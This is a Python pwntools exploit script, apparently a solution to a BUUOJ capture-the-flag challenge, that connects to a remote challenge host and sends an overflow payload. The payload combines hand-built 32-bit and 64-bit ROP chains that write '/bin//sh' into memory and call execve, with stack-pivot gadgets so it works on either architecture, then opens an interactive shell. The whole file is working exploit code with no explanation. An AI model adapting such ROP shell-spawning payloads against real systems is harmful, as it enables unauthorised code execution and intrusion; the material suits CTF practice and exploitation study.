#! /user/bin/python

from pwn import *
from struct import pack


p = remote("node3.buuoj.cn",27514)

# 32bit ropchain
rop32 = ''
rop32 += pack('<I', 0x0806e9cb) # pop edx ; ret
rop32 += pack('<I', 0x080d9060) # @ .data
rop32 += pack('<I', 0x080a8af6) # pop eax ; ret
rop32 += '/bin'
rop32 += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
rop32 += pack('<I', 0x0806e9cb) # pop edx ; ret
rop32 += pack('<I', 0x080d9064) # @ .data + 4
rop32 += pack('<I', 0x080a8af6) # pop eax ; ret
rop32 += '//sh'
rop32 += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
rop32 += pack('<I', 0x0806e9cb) # pop edx ; ret
rop32 += pack('<I', 0x080d9068) # @ .data + 8
rop32 += pack('<I', 0x08056040) # xor eax, eax ; ret
rop32 += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
rop32 += pack('<I', 0x080481c9) # pop ebx ; ret
rop32 += pack('<I', 0x080d9060) # @ .data
rop32 += pack('<I', 0x0806e9f2) # pop ecx ; pop ebx ; ret
rop32 += pack('<I', 0x080d9068) # @ .data + 8
rop32 += pack('<I', 0x080d9060) # padding without overwrite ebx
rop32 += pack('<I', 0x0806e9cb) # pop edx ; ret
rop32 += pack('<I', 0x080d9068) # @ .data + 8
rop32 += pack('<I', 0x08056040) # xor eax, eax ; ret
rop32 += pack('<I', 0x080a8af6) # pop eax ; ret
rop32 += p32(0xb)
rop32 += pack('<I', 0x080495a3) # int 0x80

# 64bit ropchain
rop64 = ''
rop64 += pack('<Q', 0x0000000000405895) # pop rsi ; ret
rop64 += pack('<Q', 0x00000000006a10e0) # @ .data
rop64 += pack('<Q', 0x000000000043b97c) # pop rax ; ret
rop64 += '/bin//sh'
rop64 += pack('<Q', 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret
rop64 += pack('<Q', 0x0000000000405895) # pop rsi ; ret
rop64 += pack('<Q', 0x00000000006a10e8) # @ .data + 8
rop64 += pack('<Q', 0x0000000000436ed0) # xor rax, rax ; ret
rop64 += pack('<Q', 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret
rop64 += pack('<Q', 0x00000000004005f6) # pop rdi ; ret
rop64 += pack('<Q', 0x00000000006a10e0) # @ .data
rop64 += pack('<Q', 0x0000000000405895) # pop rsi ; ret
rop64 += pack('<Q', 0x00000000006a10e8) # @ .data + 8
rop64 += pack('<Q', 0x000000000043b9d5) # pop rdx ; ret
rop64 += pack('<Q', 0x00000000006a10e8) # @ .data + 8
rop64 += pack('<Q', 0x0000000000436ed0) # xor rax, rax ; ret
rop64 += pack('<Q', 0x000000000043b97c) # pop rax ; ret
rop64 += p64(0x3b)
rop64 += pack('<Q', 0x0000000000461645) # syscall ; ret

add_esp = 0x080a8f69 # add esp, 0xc ; ret
add_rsp = 0x00000000004079d4 # add rsp, 0xd8 ; ret

payload = '\x00' * 0x110 + p64(add_esp) + p64(add_rsp) + rop32.ljust(0xd8,'\x00')
payload+= rop64
p.sendline(payload)
p.interactive()
